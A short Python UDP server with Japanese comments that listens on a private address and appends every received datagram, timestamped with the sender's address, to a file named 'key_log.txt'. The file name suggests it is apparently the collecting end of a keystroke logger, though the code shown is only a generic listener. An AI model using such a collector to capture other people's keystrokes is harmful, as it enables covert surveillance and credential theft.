# server.py
import socket
import datetime

ip_address = '172.21.1.76'
port = 7010
buffer_size = 4092

# Socketの作成
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    # IP Adress とPort番号をソケット割り当てる
    s.bind((ip_address, port))
    # while Trueでクライアントからの要求を待つ
    while True:
        # データを受信する
        data, addr = s.recvfrom(buffer_size)
        dt_now = datetime.datetime.now()
        with open("./key_log.txt", "a") as f:
            f.write(dt_now.strftime("%Y-%m-%d %H:%M:%S") + '|  data-> {}, addr->{}'.format(data, addr))
        # print('data-> {}, addr->{}'.format(data, addr))